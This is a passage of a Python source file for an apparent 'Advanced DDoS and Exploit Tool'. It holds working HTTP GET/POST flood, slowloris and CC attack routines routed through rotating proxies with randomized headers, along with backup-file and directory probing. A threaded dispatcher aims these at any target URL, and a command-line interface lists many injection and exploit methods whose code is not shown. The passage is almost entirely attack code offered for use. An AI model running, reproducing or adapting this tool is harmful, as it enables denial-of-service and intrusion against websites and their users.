                parsed_url = urllib.parse.urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                for file in self.exploit_payloads["backup_files"]:
                    test_url = f"{base_url}/{file}"
                    response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                    
                    if self.check_backup_files(response):
                        vuln = {
                            "type": "Backup File",
                            "url": test_url,
                            "evidence": f"File {file} is accessible"
                        }
                        self.vuln_queue.put(vuln)
                        print(f"{Fore.GREEN}[!] Backup File found: {test_url}")
                        break
                    
                    self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def common_dirs_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                parsed_url = urllib.parse.urlparse(self.target_url)
                base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
                
                for directory in self.exploit_payloads["common_dirs"]:
                    test_url = f"{base_url}/{directory}"
                    response = requests.get(test_url, proxies=proxy_dict, verify=False, timeout=10)
                    
                    if self.check_common_dirs(response):
                        vuln = {
                            "type": "Open Directory",
                            "url": test_url,
                            "evidence": f"Directory {directory} is accessible"
                        }
                        self.vuln_queue.put(vuln)
                        print(f"{Fore.GREEN}[!] Open Directory found: {test_url}")
                        break
                    
                    self.stats_queue.put(("request", response.status_code))
                
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def http_flood_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                payload = random.choice(self.ddos_payloads["http_flood"])
                url = f"{self.target_url}{payload['path']}"
                
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Referer": random.choice(self.referers),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1"
                }
                
                response = requests.get(url, headers=headers, proxies=proxy_dict, verify=False, timeout=10)
                
                self.stats_queue.put(("request", response.status_code))
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def post_flood_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                payload = random.choice(self.ddos_payloads["post_flood"])
                url = f"{self.target_url}{payload['path']}"
                
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Referer": random.choice(self.referers),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                
                response = requests.post(url, headers=headers, data=payload["data"], proxies=proxy_dict, verify=False, timeout=10)
                
                self.stats_queue.put(("request", response.status_code))
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def slowloris_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_parts = proxy.split(":")
                proxy_host = proxy_parts[0]
                proxy_port = int(proxy_parts[1])
                
                parsed_url = urllib.parse.urlparse(self.target_url)
                target_host = parsed_url.netloc
                target_port = 443 if parsed_url.scheme == "https" else 80
                
                payload = random.choice(self.ddos_payloads["slowloris"])
                
                # Create socket through proxy
                s = socks.socksocket()
                s.set_proxy(socks.HTTP, proxy_host, proxy_port)
                s.settimeout(10)
                
                if parsed_url.scheme == "https":
                    s = ssl.wrap_socket(s)
                
                s.connect((target_host, target_port))
                
                # Send partial HTTP request
                request = f"{payload['method']} {payload['path']} HTTP/1.1\r\n"
                request += f"Host: {target_host}\r\n"
                request += f"User-Agent: {random.choice(self.user_agents)}\r\n"
                
                for header, value in payload["headers"].items():
                    request += f"{header}: {value}\r\n"
                
                request += "\r\n"
                
                s.send(request.encode())
                
                # Keep connection open
                while not self.stop_event.is_set():
                    try:
                        s.send("X-a: b\r\n".encode())
                        time.sleep(10)
                    except:
                        break
                
                s.close()
                self.stats_queue.put(("request", 200))
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def cc_attack(self):
        while not self.stop_event.is_set():
            try:
                proxy = self.proxy_queue.get()
                proxy_dict = {
                    "http": f"http://{proxy}",
                    "https": f"http://{proxy}"
                }
                
                payload = random.choice(self.ddos_payloads["cc_attack"])
                url = f"{self.target_url}{payload['path']}"
                
                headers = {
                    "User-Agent": random.choice(self.user_agents),
                    "Referer": random.choice(self.referers),
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Accept-Language": "en-US,en;q=0.5",
                    "Accept-Encoding": "gzip, deflate",
                    "Connection": "keep-alive",
                    "Upgrade-Insecure-Requests": "1",
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                
                if payload["method"] == "GET":
                    response = requests.get(url, headers=headers, params=payload["data"], proxies=proxy_dict, verify=False, timeout=10)
                else:
                    response = requests.post(url, headers=headers, data=payload["data"], proxies=proxy_dict, verify=False, timeout=10)
                
                self.stats_queue.put(("request", response.status_code))
                self.proxy_queue.put(proxy)
            except Exception as e:
                self.stats_queue.put(("error", str(e)))
                self.proxy_queue.put(proxy)
    
    def stats_collector(self):
        start_time = time.time()
        self.results["start_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
        
        while not self.stop_event.is_set():
            try:
                stat_type, stat_value = self.stats_queue.get(timeout=1)
                
                if stat_type == "request":
                    self.results["requests_sent"] += 1
                    if 200 <= stat_value < 300:
                        self.results["successful_requests"] += 1
                    else:
                        self.results["failed_requests"] += 1
                elif stat_type == "error":
                    self.results["requests_sent"] += 1
                    self.results["failed_requests"] += 1
            except queue.Empty:
                pass
            
            # Print stats every 5 seconds
            if int(time.time()) % 5 == 0:
                elapsed = time.time() - start_time
                rps = self.results["requests_sent"] / elapsed if elapsed > 0 else 0
                success_rate = (self.results["successful_requests"] / self.results["requests_sent"]) * 100 if self.results["requests_sent"] > 0 else 0
                
                print(f"{Fore.CYAN}[*] Requests: {self.results['requests_sent']} | Success: {self.results['successful_requests']} | Failed: {self.results['failed_requests']} | RPS: {rps:.2f} | Success Rate: {success_rate:.2f}%")
        
        self.results["end_time"] = time.strftime("%Y-%m-%d %H:%M:%S")
    
    def vuln_collector(self):
        while not self.stop_event.is_set():
            try:
                vuln = self.vuln_queue.get(timeout=1)
                self.results["vulnerabilities_found"].append(vuln)
            except queue.Empty:
                pass
    
    def run_attack(self, attack_methods, exploit_methods):
        print(f"{Fore.CYAN}[*] Starting DDoS and exploit attack on {self.target_url}")
        print(f"{Fore.CYAN}[*] Duration: {self.duration} seconds")
        print(f"{Fore.CYAN}[*] Threads: {self.threads}")
        print(f"{Fore.CYAN}[*] DDoS methods: {', '.join(attack_methods)}")
        print(f"{Fore.CYAN}[*] Exploit methods: {', '.join(exploit_methods)}")
        
        # Add attack methods to results
        self.results["attack_methods"] = attack_methods + exploit_methods
        
        # Start stats collector thread
        stats_thread = threading.Thread(target=self.stats_collector)
        stats_thread.daemon = True
        stats_thread.start()
        
        # Start vulnerability collector thread
        vuln_thread = threading.Thread(target=self.vuln_collector)
        vuln_thread.daemon = True
        vuln_thread.start()
        
        # Start attack threads
        threads = []
        
        # DDoS attack threads
        ddos_threads_per_method = self.threads // len(attack_methods)
        for method in attack_methods:
            for i in range(ddos_threads_per_method):
                if method == "http_flood":
                    t = threading.Thread(target=self.http_flood_attack)
                elif method == "post_flood":
                    t = threading.Thread(target=self.post_flood_attack)
                elif method == "slowloris":
                    t = threading.Thread(target=self.slowloris_attack)
                elif method == "cc_attack":
                    t = threading.Thread(target=self.cc_attack)
                
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Exploit attack threads
        exploit_threads_per_method = self.threads // len(exploit_methods)
        for method in exploit_methods:
            for i in range(exploit_threads_per_method):
                if method == "sql_injection":
                    t = threading.Thread(target=self.sql_injection_attack)
                elif method == "blind_sql_injection":
                    t = threading.Thread(target=self.blind_sql_injection_attack)
                elif method == "nosql_injection":
                    t = threading.Thread(target=self.nosql_injection_attack)
                elif method == "command_injection":
                    t = threading.Thread(target=self.command_injection_attack)
                elif method == "ldap_injection":
                    t = threading.Thread(target=self.ldap_injection_attack)
                elif method == "xxe_injection":
                    t = threading.Thread(target=self.xxe_injection_attack)
                elif method == "xpath_injection":
                    t = threading.Thread(target=self.xpath_injection_attack)
                elif method == "ssi_injection":
                    t = threading.Thread(target=self.ssi_injection_attack)
                elif method == "xss":
                    t = threading.Thread(target=self.xss_attack)
                elif method == "path_traversal":
                    t = threading.Thread(target=self.path_traversal_attack)
                elif method == "ssrf":
                    t = threading.Thread(target=self.ssrf_attack)
                elif method == "rfi":
                    t = threading.Thread(target=self.rfi_attack)
                elif method == "lfi":
                    t = threading.Thread(target=self.lfi_attack)
                elif method == "jwt_none":
                    t = threading.Thread(target=self.jwt_none_attack)
                elif method == "xml_bomb":
                    t = threading.Thread(target=self.xml_bomb_attack)
                elif method == "weak_credentials":
                    t = threading.Thread(target=self.weak_credentials_attack)
                elif method == "idor":
                    t = threading.Thread(target=self.idor_attack)
                elif method == "csrf":
                    t = threading.Thread(target=self.csrf_attack)
                elif method == "cors":
                    t = threading.Thread(target=self.cors_attack)
                elif method == "http_methods":
                    t = threading.Thread(target=self.http_methods_attack)
                elif method == "backup_files":
                    t = threading.Thread(target=self.backup_files_attack)
                elif method == "common_dirs":
                    t = threading.Thread(target=self.common_dirs_attack)
                
                t.daemon = True
                t.start()
                threads.append(t)
        
        # Run for specified duration
        time.sleep(self.duration)
        self.stop_event.set()
        
        # Wait for threads to finish
        for t in threads:
            t.join(timeout=1)
        
        # Save results
        if self.output_file:
            with open(self.output_file, "w") as f:
                json.dump(self.results, f, indent=4)
            print(f"{Fore.CYAN}[*] Results saved to {self.output_file}")
        
        print(f"{Fore.CYAN}[*] Attack completed")
        print(f"{Fore.CYAN}[*] Total requests: {self.results['requests_sent']}")
        print(f"{Fore.CYAN}[*] Successful requests: {self.results['successful_requests']}")
        print(f"{Fore.CYAN}[*] Failed requests: {self.results['failed_requests']}")
        print(f"{Fore.CYAN}[*] Vulnerabilities found: {len(self.results['vulnerabilities_found'])}")
        
        return self.results

def main():
    parser = argparse.ArgumentParser(description="Advanced DDoS and Exploit Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-o", "--output", help="Output file to save results")
    parser.add_argument("-d", "--duration", type=int, default=60, help="Attack duration in seconds (default: 60)")
    parser.add_argument("-t", "--threads", type=int, default=50, help="Number of threads (default: 50)")
    parser.add_argument("-p", "--proxy-file", help="File containing proxies (one per line)")
    parser.add_argument("--user-agent", help="Custom User-Agent")
    parser.add_argument("--ddos-methods", nargs="+", default=["http_flood", "post_flood"], 
                        choices=["http_flood", "post_flood", "slowloris", "cc_attack"],
                        help="DDoS attack methods (default: http_flood post_flood)")
    parser.add_argument("--exploit-methods", nargs="+", 
                        choices=["sql_injection", "blind_sql_injection", "nosql_injection", "command_injection", 
                                "ldap_injection", "xxe_injection", "xpath_injection", "ssi_injection", "xss", 
                                "path_traversal", "ssrf", "rfi", "lfi", "jwt_none", "xml_bomb", "weak_credentials", 
                                "idor", "csrf", "cors", "http_methods", "backup_files", "common_dirs"],
                        help="Exploit methods")
    
    args = parser.parse_args()
    
    ddos_exploit_tool = DDoSExploitTool(
        target_url=args.url,
        output_file=args.output,
        duration=args.duration,
        threads=args.threads,
        proxy_file=args.proxy_file,
        user_agent=args.user_agent
    )
    
    # Fetch proxies if no proxy file provided
    if not args.proxy_file:
        ddos_exploit_tool.fetch_proxies()
    
    # Test proxies
    ddos_exploit_tool.test_proxies()
    
    # Set default exploit methods if not specified
    if not args.exploit_methods:
        args.exploit_methods = ["sql_injection", "xss", "path_traversal"]
    
    # Run attack
    ddos_exploit_tool.run_attack(args.ddos_methods, args.exploit_methods)

if __name__ == "__main__":
    main()
